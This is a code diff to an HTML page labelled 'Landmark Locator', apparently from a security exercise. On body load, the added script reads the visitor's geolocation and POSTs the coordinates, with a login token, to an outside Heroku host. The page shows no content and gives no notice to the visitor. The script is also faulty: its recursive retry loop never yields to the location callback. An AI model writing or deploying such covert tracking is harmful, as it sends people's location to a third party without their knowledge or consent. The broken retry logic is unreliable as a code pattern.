@@ -7,23 +7,43 @@
     <title>Landmark Locator</title>
     <link rel="stylesheet" href="landmarkstyle.css" type="text/css" />
     <script>
-      var pos = {};
-      navigator.geolocation.getCurrentPosition(function(position) {
-        pos = position.coords;
-      });
-      var xhr = new XMLHttpRequest();
-      var uri = "https://defense-in-derpth.herokuapp.com/sendLocation";
-      xhr.open("POST", uri, true);
-      xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-      xhr.onreadystatechange = function () {
-        //Do stuff here
-      }
-      xhr.send("login=iJRFOmvB&lat=" + pos.latitude + "&lng=" + pos.longitude);
-
+      function getLocation(){
+        var lat = -999;
+        var long = -999;
+        var xhr = new XMLHttpRequest();
+        navigator.geolocation.getCurrentPosition(function(position) {
+          lat = position.coords.latitude;
+          long = position.coords.longitude;
+          console.log("lat1 = " + lat);
+          console.log("long1 = " + long);
+        });
+        var uri = "https://defense-in-derpth.herokuapp.com/sendLocation";
+        xhr.open("POST", uri, true);
+        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState == 4 && xhr.status == 200) {
+            console.log(xhr.responseText);
+          }
+        };
+        function sendLocation(){
+          console.log("Is this being called?");
+          if (lat > -90 && long > -180) {
+            console.log("lat3 = " + lat);
+            console.log("long3 = " + long);
+            xhr.send("login=iJRFOmvB&lat=" + lat + "&lng=" + long);
+            console.log("SUCCESS!");
+          } else {
+            sendLocation();
+            console.log("Recurse");
+          }
+        };
+        sendLocation();
+      };
+      
     </script>
   </head>
 
-  <body>
+  <body onload="getLocation()">
   </body>
   
 </html>
